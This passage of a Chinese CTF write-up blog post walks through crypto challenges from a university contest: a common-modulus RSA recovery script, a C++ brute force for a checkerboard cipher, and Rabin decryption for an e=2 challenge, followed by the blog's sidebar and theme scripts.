egcd(e1, e2)</span><br><span class="line">		s1 = s[<span class="number">1</span>]</span><br><span class="line">		s2 = s[<span class="number">2</span>]</span><br><span class="line">		<span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">			s1 = -s1</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				c1 = gmpy2.invert(c1, n)</span><br><span class="line">			<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">			s2 = -s2</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				c2 = gmpy2.invert(c2, n)</span><br><span class="line">			<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">		m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			temp = <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(m).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> temp:</span><br><span class="line">				<span class="built_in">print</span> temp</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">except</span> TypeError:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+<p>等了大概半分钟，出现flag：</p>
+<p><img src="https://s1.ax1x.com/2018/12/15/FadvRJ.png" alt="img"></p>
+<h3 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h3><p>密文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ksyssskkysynbssbbnynnb</span><br></pre></td></tr></table></figure>
+
+<p>提示：</p>
+<p>棋盘不是万能的，没有棋盘是万万不能的。</p>
+<p>联想棋盘密码，刚好密文中只有5中字符：k, s, y, n, b。</p>
+<p>两个一组查表，C++爆破脚本如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">99</span>;</span><br><span class="line"><span class="keyword">char</span> alpha[] = <span class="string">&quot;abcdefghiklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> cipher[] = <span class="string">&quot;ksyssskkysynbssbbnynnb&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> tbl[] = <span class="string">&quot;ksynb&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="built_in">strlen</span>(cipher);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">char</span> flag[<span class="number">99</span>];</span><br><span class="line">                map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                        m[tbl[i]] = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">int</span> t = m[cipher[i]]*<span class="number">5</span>+m[cipher[i+<span class="number">1</span>]];</span><br><span class="line">                        flag[j++] = alpha[t];</span><br><span class="line">                &#125;</span><br><span class="line">                flag[j] = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">        &#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(tbl,tbl+<span class="number">5</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到运行结果：（一共5! = 120 种）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bmgamowkyou ekzakipxois ditaikospkx ekzakhuysho ditaihyuxhp chnahksouky chnahixpyiu oytnyvirfvb puznuqkwfqb sxntxvhmfvb xsnzsqhmfqb upztplkwflb yotzolirflb iytgyvoslvc kuzguqpxlqc hxngxvsoqvd hsngsqxpvqe kpzgpluyqld iotgolyuvle rwgtwvmhlvc wrgzrqmhlqc mwgnwvriqvd mrgnrqwkvqe wmgzmlriqld rmgtmlwkvle ukztkfpxlfc yitzifoslfc pkznkfuyqfd oitnifyuvfe xhnzhfsoqfd shnthfxpvfe lvanvyfbiyr lqanqufbkuw qvatvxfbhxm vqazqsfbhsm qlatlpfbkpw vlazlofbior fvagvylcoys fqagqulcpux fvagvxqdsxo fqagqsvexsp flaglpqdupy flagloveyou qvatvwlcmwh vqazqrlcmrh lvanvwqdrwi lqanqrvewrk vlazlmqdrmi qlatlmvewmk qfatfklcpkx vfazfilcois lfanfkqduky lfanfiveyiu vfazfhqdsho qfatfhvexhp peznedkwidr odtndeirkew uezteckwhcm ydtzdcirhcm scntcehmkew xcnzcdhmidr kezgedpxods idtgdeospex kezgecuysco idtgdcyuxcp hcngcesouey hcngcdxpydu ueztebpxmbh ydtzdbosmbh peznebuyrbi odtndbyuwbk xcnzcbsorbi scntcbxpwbk rbgtbemhpex wbgzbdmhods mbgnberiuey mbgnbdwkydu wbgzbcrisco rbgtbcwkxcp</span><br></pre></td></tr></table></figure>
+
+<p>复制进npp，搜索flag，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flaglpqdupy flagloveyou</span><br></pre></td></tr></table></figure>
+
+<p>肯定是选择第二个。</p>
+<h2 id="First-Level"><a href="#First-Level" class="headerlink" title="First Level"></a>First Level</h2><p>文件给出n, e, c。</p>
+<p>推测是RSA密码，e很小，联想到刚学的低加密指数攻击，在Google上搜了很久，试了各种脚本，发现解不出d。</p>
+<p>后来，才想起来前提gcd(e,φ(n)) = 1（两者要互素），但是e = 2，而φ(n)一定是偶数，所以互素显然不能成立。</p>
+<p>然后试了试比较暴力的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i=<span class="number">0</span></span><br><span class="line">   <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">if</span>(gmpy2.root(c+i*n, <span class="number">2</span>)[<span class="number">1</span>]==<span class="number">1</span>):</span><br><span class="line">     <span class="built_in">print</span> gmpy2.root(c+i*n, <span class="number">2</span>)</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line">   i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>但是用它跑了几小时都出不了结果。</p>
+<p>我甚至还用<code>yafu</code>把因数分解出来了。（下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/yafu/%EF%BC%89">https://sourceforge.net/projects/yafu/）</a></p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FddSoT.png" alt="img"></p>
+<p>但是还是没有方法解出来。</p>
+<p>然后怀疑人生，然后用Google搜了下<code>RSA e = 2</code>，然后发现有个类似的密码体制和RSA相似，而且它的加密指数就是2！</p>
+<p>Python脚本解决：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line">c = <span class="number">499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span></span><br><span class="line">p = <span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span></span><br><span class="line">q = <span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span></span><br><span class="line">    </span><br><span class="line">X = rabin_decrypt(c, p, q, e=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> X:</span><br><span class="line">    t = <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(x).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> t:</span><br><span class="line">        <span class="built_in">print</span> t</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdJ60S.png" alt="img"></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/ctf/">ctf</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/cumt双月赛一/">cumt双月赛一</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2018/12/16/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%80/" data-title="CUMT-12月月赛 | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2018/12/16/大学CTF/Bugku-Web-WriteUp/" title="Bugku_Web_WriteUp">
+  <strong>上一篇：</strong><br/>
+  <span>
+  Bugku_Web_WriteUp</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/12/16/大学CTF/2018安恒11月月赛/"  title="2018安恒11月月赛">
+ <strong>下一篇：</strong><br/> 
+ <span>2018安恒11月月赛
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">现代密码签到题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-upload"><span class="toc-number">3.1.</span> <span class="toc-text">ez-upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tp5"><span class="toc-number">3.2.</span> <span class="toc-text">Tp5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE"><span class="toc-number">4.</span> <span class="toc-text">CVE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number"></span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0%E9%A2%98-1"><span class="toc-number">1.</span> <span class="toc-text">现代密码签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">古典密码签到题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#First-Level"><span class="toc-number"></span> <span class="toc-text">First Level</span></a>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
